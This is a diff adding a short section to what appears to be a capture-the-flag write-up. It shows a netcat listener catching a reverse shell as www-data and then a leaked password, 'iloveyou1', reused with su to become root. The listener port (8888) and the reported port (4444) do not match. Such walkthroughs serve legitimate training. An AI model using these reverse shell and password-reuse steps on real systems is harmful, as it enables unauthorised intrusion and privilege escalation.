@@ -108,9 +108,23 @@ ZIP file download.
 </html>
 ```
 
-getting the reverse shell
+Getting the reverse shell
 
 ```
+abhi@abhi-Lenovo-IdeaPad-S145-15IKB:~$ nc -lnvp 8888
+Listening on 0.0.0.0:4444
+Connection received from 10.10.11.25:56234
+$ whoami
+www-data
+$ pwd
+/var/www/html
+```
 
+Trying the same password ("iloveyou1") to login as the root user 
 
+```
+$ su
+Password :
+# whoami
+root
 ```
